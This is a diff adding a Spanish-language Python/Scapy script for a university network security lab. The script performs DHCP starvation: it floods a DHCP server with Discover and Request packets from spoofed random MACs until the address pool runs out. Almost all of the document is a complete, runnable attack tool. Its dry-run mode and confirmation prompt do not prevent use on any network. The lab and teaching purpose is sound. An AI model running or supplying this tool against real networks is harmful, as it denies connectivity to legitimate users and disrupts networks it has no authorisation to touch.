@@ -1,0 +1,245 @@
+#!/usr/bin/env python3
+"""
+╔══════════════════════════════════════════════════════════════╗
+║         DHCP STARVATION - Laboratorio Académico             ║
+║         Instituto Tecnológico de las Américas (ITLA)        ║
+║         Matrícula : 20250730                                 ║
+║         Materia   : Seguridad de Redes                       ║
+║         Entorno   : PNetLab (Red virtualizada)               ║
+╠══════════════════════════════════════════════════════════════╣
+║  ADVERTENCIA: Uso exclusivo en laboratorio académico         ║
+║  autorizado. Prohibido su uso fuera de este entorno.         ║
+╚══════════════════════════════════════════════════════════════╝
+
+Red de laboratorio (matrícula 20250730): 20.25.7.0/24
+  Atacante  : 20.25.7.30
+  Servidor  : 20.25.7.1
+  Pool DHCP : 20.25.7.10 - 20.25.7.254 (245 IPs)
+
+Uso:
+  # Modo simulación (sin enviar tráfico real):
+  python3 dhcp_starvation.py --iface eth0 --count 10 --dry-run
+
+  # Modo laboratorio (requiere confirmación + root):
+  sudo python3 dhcp_starvation.py --iface eth0 --count 245 --verbose
+"""
+
+import argparse
+import sys
+import time
+import random
+import os
+
+# ─── Colores ANSI ────────────────────────────────────────────
+R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"
+B = "\033[94m"; C = "\033[96m"; W = "\033[0m"
+
+
+def verificar_dependencias():
+    try:
+        import scapy  # noqa
+        return True
+    except ImportError:
+        print(f"{R}[ERROR]{W} Scapy no encontrado.")
+        print(f"        Instalar con: pip3 install scapy")
+        sys.exit(1)
+
+
+def mac_aleatoria():
+    """Genera MAC aleatoria con OUI ficticio (02:xx: para LAB)."""
+    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(
+        random.randint(0, 255) for _ in range(5)
+    )
+
+
+def construir_discover(mac_src):
+    """
+    Construye DHCP Discover.
+    Stack: Ether / IP / UDP(68->67) / BOOTP / DHCP
+    """
+    from scapy.all import Ether, IP, UDP, BOOTP, DHCP
+    xid = random.randint(1, 0xFFFFFFFF)
+    mac_bytes = bytes.fromhex(mac_src.replace(":", ""))
+    pkt = (
+        Ether(src=mac_src, dst="ff:ff:ff:ff:ff:ff") /
+        IP(src="0.0.0.0", dst="255.255.255.255") /
+        UDP(sport=68, dport=67) /
+        BOOTP(chaddr=mac_bytes, xid=xid, flags=0x8000) /
+        DHCP(options=[
+            ("message-type", "discover"),
+            ("hostname", f"lab-{xid & 0xFFFF:04x}"),
+            ("param_req_list", [1, 3, 6, 15, 51]),
+            "end"
+        ])
+    )
+    return pkt, xid
+
+
+def construir_request(mac_src, ip_ofrecida, ip_servidor, xid):
+    """
+    Construye DHCP Request para confirmar (reservar) la IP ofrecida.
+    """
+    from scapy.all import Ether, IP, UDP, BOOTP, DHCP
+    mac_bytes = bytes.fromhex(mac_src.replace(":", ""))
+    pkt = (
+        Ether(src=mac_src, dst="ff:ff:ff:ff:ff:ff") /
+        IP(src="0.0.0.0", dst="255.255.255.255") /
+        UDP(sport=68, dport=67) /
+        BOOTP(chaddr=mac_bytes, xid=xid, flags=0x8000) /
+        DHCP(options=[
+            ("message-type", "request"),
+            ("requested_addr", ip_ofrecida),
+            ("server_id", ip_servidor),
+            "end"
+        ])
+    )
+    return pkt
+
+
+def modo_simulacion(count, verbose):
+    """
+    DRY-RUN: Construye paquetes en memoria y los muestra.
+    No envía tráfico a la red. Ideal para demostración.
+    """
+    print(f"\n{Y}[DRY-RUN]{W} Simulación — no se envía tráfico real\n")
+    for i in range(1, count + 1):
+        mac = mac_aleatoria()
+        pkt, xid = construir_discover(mac)
+        if verbose:
+            print(f"{C}[PKT #{i:03d}]{W} Discover | MAC={mac} | XID=0x{xid:08x}")
+            pkt.show2()
+        else:
+            print(f"{G}[SIM #{i:03d}]{W} DHCP Discover → MAC={mac} | XID=0x{xid:08x}")
+        time.sleep(0.05)
+    print(f"\n{G}[OK]{W} Simulación completada: {count} paquetes construidos (no enviados)")
+    print(f"     Usa sin --dry-run en PNetLab para el ataque real.\n")
+
+
+def modo_laboratorio(iface, count, delay, verbose):
+    """
+    Modo real: envía DHCP Discover + Request con MACs falsas.
+    Agota el pool DHCP del servidor en la red virtualizada.
+    """
+    from scapy.all import sendp, sniff, conf
+    conf.verb = 0  # Silenciar Scapy
+
+    print(f"\n{R}[LABORATORIO]{W} Iniciando DHCP Starvation en interfaz {iface}")
+    print(f"             Red: 20.25.7.0/24 | Pool: 20.25.7.10-254 ({count} IPs)\n")
+
+    ips_reservadas = []
+    sin_respuesta = 0
+
+    for i in range(1, count + 1):
+        mac = mac_aleatoria()
+        discover, xid = construir_discover(mac)
+
+        try:
+            sendp(discover, iface=iface, verbose=0)
+
+            # Escuchar DHCP Offer
+            resp = sniff(
+                iface=iface,
+                filter="udp and (port 67 or port 68)",
+                count=1,
+                timeout=1.5
+            )
+
+            ip_asignada = None
+            ip_server   = "20.25.7.1"
+
+            if resp:
+                pkt = resp[0]
+                if pkt.haslayer("DHCP"):
+                    opts = {o[0]: o[1] for o in pkt["DHCP"].options if isinstance(o, tuple)}
+                    if opts.get("message-type") == 2:      # DHCP Offer
+                        ip_asignada = pkt["BOOTP"].yiaddr
+                        ip_server   = opts.get("server_id", "20.25.7.1")
+
+                        # Confirmar → reserva la IP
+                        req = construir_request(mac, ip_asignada, ip_server, xid)
+                        sendp(req, iface=iface, verbose=0)
+                        ips_reservadas.append(ip_asignada)
+
+                        if verbose:
+                            print(f"{G}[+]{W} #{i:03d} MAC={mac} → IP={ip_asignada} RESERVADA")
+                    else:
+                        sin_respuesta += 1
+                        if verbose:
+                            print(f"{Y}[-]{W} #{i:03d} MAC={mac} → Sin Offer (pool lleno?)")
+            else:
+                sin_respuesta += 1
+                if verbose:
+                    print(f"{Y}[~]{W} #{i:03d} MAC={mac} → Timeout")
+
+            if i % 20 == 0:
+                print(f"{B}[PROGRESO]{W} {i}/{count} | Reservadas: {len(ips_reservadas)} | Sin resp: {sin_respuesta}")
+
+            time.sleep(delay)
+
+        except PermissionError:
+            print(f"{R}[ERROR]{W} Requiere root: sudo python3 dhcp_starvation.py ...")
+            sys.exit(1)
+        except Exception as e:
+            sin_respuesta += 1
+            if verbose:
+                print(f"{R}[ERR]{W} #{i}: {e}")
+
+    # ─── Resumen ─────────────────────────────────────────────
+    print("\n" + "═" * 56)
+    print(f"  {B}RESUMEN — DHCP Starvation{W}")
+    print("═" * 56)
+    print(f"  Paquetes enviados      : {count}")
+    print(f"  IPs reservadas (pool)  : {len(ips_reservadas)}")
+    print(f"  Sin respuesta          : {sin_respuesta}")
+    if ips_reservadas:
+        print(f"  Primera IP agotada     : {ips_reservadas[0]}")
+        print(f"  Última IP agotada      : {ips_reservadas[-1]}")
+    print("═" * 56)
+    print(f"\n{Y}[VALIDAR]{W} En el cliente Windows:")
+    print(f"  ipconfig /release && ipconfig /renew")
+    print(f"  Resultado esperado: IP APIPA 169.254.x.x o fallo\n")
+    print(f"{Y}[VALIDAR]{W} En el servidor Ubuntu:")
+    print(f"  journalctl -u isc-dhcp-server | grep 'no free leases'\n")
+
+
+# ─── MAIN ─────────────────────────────────────────────────────
+def main():
+    banner = f"""
+{B}╔══════════════════════════════════════════════════════════╗
+║         DHCP STARVATION — ITLA Seguridad de Redes        ║
+║         Matrícula: 20250730 | Red: 20.25.7.0/24          ║
+╚══════════════════════════════════════════════════════════╝{W}"""
+    print(banner)
+
+    parser = argparse.ArgumentParser(
+        description="DHCP Starvation — Lab académico ITLA (Matrícula 20250730)"
+    )
+    parser.add_argument("--iface",   default="eth0",
+                        help="Interfaz de red (default: eth0)")
+    parser.add_argument("--count",   type=int, default=245,
+                        help="Número de solicitudes DHCP (default: 245 = tamaño del pool)")
+    parser.add_argument("--delay",   type=float, default=0.1,
+                        help="Segundos entre paquetes (default: 0.1)")
+    parser.add_argument("--verbose", action="store_true",
+                        help="Mostrar detalle de cada paquete")
+    parser.add_argument("--dry-run", action="store_true", dest="dry_run",
+                        help="Simular sin enviar tráfico (demostración)")
+    args = parser.parse_args()
+
+    verificar_dependencias()
+
+    if args.dry_run:
+        modo_simulacion(args.count, args.verbose)
+    else:
+        # Confirmación de seguridad
+        print(f"{Y}[AVISO]{W} Este modo enviará tráfico real en la red virtualizada PNetLab.")
+        print(f"        Confirma que estás en el laboratorio académico autorizado.")
+        confirmacion = input(f"        Escribe 'LABORATORIO' para continuar: ").strip()
+        if confirmacion != "LABORATORIO":
+            print(f"{R}[ABORTADO]{W} Confirmación incorrecta.")
+            sys.exit(0)
+        modo_laboratorio(args.iface, args.count, args.delay, args.verbose)
+
+
+if __name__ == "__main__":
+    main()
